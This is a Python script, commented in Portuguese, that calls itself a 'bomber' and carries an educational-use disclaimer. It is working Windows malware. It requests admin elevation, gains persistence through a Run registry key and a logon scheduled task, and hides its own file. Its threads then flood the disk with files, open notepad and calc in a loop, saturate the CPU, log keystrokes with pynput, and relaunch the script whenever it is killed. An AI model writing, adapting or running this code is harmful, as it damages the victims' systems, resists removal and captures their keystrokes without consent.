#
# PARA FINS EDUCACIONAIS APENAS. O AUTOR NÃO SE RESPONSABILIZA PELO USO INDEVIDO E MALICIOSO DESSE SCRIPT 
# 
# FEITO POR OLIVER M4SK3LYN3
# 
# email: m4sk3lyn3.net@gmail.com
# 

import os
import random
import sys
import ctypes
import subprocess
import shutil
import time
import threading
from datetime import datetime

# Variável global para controle de execução
running = True

# Verifica se o script está sendo executado como administrador
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Eleva as permissões automaticamente
def elevate_permissions():
    if not is_admin():
        print("Tentando obter permissões de administrador...")
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()

# Adiciona o script ao registro do Windows para persistência (sem admin)
def add_to_registry():
    import winreg

    script_path = os.path.abspath(sys.argv[0])
    key = winreg.HKEY_CURRENT_USER
    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg, "MyPersistentScript", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg)
        print("Adicionado ao registro para persistência.")
    except Exception as e:
        print(f"Erro ao adicionar ao registro: {e}")

# Cria uma tarefa agendada para persistência (sem admin)
def create_task():
    script_path = os.path.abspath(sys.argv[0])
    task_name = "MyPersistentTask"
    command = (
        f'schtasks /create /tn "{task_name}" /tr "{sys.executable} {script_path}" '
        '/sc onlogon /rl lowest /f'
    )
    try:
        subprocess.run(command, shell=True)
        print("Tarefa agendada criada com sucesso.")
    except Exception as e:
        print(f"Erro ao criar tarefa agendada: {e}")

# Oculta o script no Windows
def hide_script():
    if os.name == "nt":
        subprocess.call(["attrib", "+h", sys.argv[0]])

# Função para criar arquivos repetidamente
def create_files():
    counter = 1
    while running:
        filename = f"bomber_file_{counter}.txt"
        with open(filename, "w") as file:
            file.write("Este é um arquivo criado pelo script bomber.\n" * 100)
        counter += 1
        time.sleep(1)

# Função para abrir aplicativos em loop
def open_apps():
    apps = ["notepad", "calc"]  # Altere os aplicativos para seu sistema
    while running:
        app = random.choice(apps)
        os.system(f"start {app}")
        time.sleep(2)

# Função para consumir CPU
def stress_cpu():
    while running:
        _ = [x ** 2 for x in range(10000)]

# Função para capturar teclas pressionadas (simples)
def log_keys():
    if os.name == "nt":
        import pynput.keyboard as keyboard # type: ignore
        log = ""

        def callback_function(key):
            nonlocal log
            try:
                log += f"{datetime.now()} - {key}\n"
            except Exception:
                pass

        listener = keyboard.Listener(on_press=callback_function)
        with listener:
            listener.join()

# Proteção contra fechamento: reinicia o script
def ensure_running():
    try:
        while True:
            process_name = os.path.basename(sys.argv[0])
            running_processes = subprocess.check_output('tasklist', shell=True, text=True)
            if process_name not in running_processes:
                subprocess.Popen([sys.executable, sys.argv[0]])
            time.sleep(5)
    except Exception:
        pass

# Menu e inicialização
def main():
    global running

    # Elevação de permissões
    elevate_permissions()

    # Persistência
    add_to_registry()
    create_task()

    # Ocultação
    hide_script()

    # Inicia tarefas em threads separadas
    threads = [
        threading.Thread(target=create_files),
        threading.Thread(target=open_apps),
        threading.Thread(target=stress_cpu),
        threading.Thread(target=log_keys),
        threading.Thread(target=ensure_running)  # Monitora interrupção
    ]

    # Inicia as threads
    for thread in threads:
        thread.daemon = True  # Torna as threads persistentes
        thread.start()

    # Mantém o script ativo
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
        print("Encerrando...")

if __name__ == "__main__":
    main()
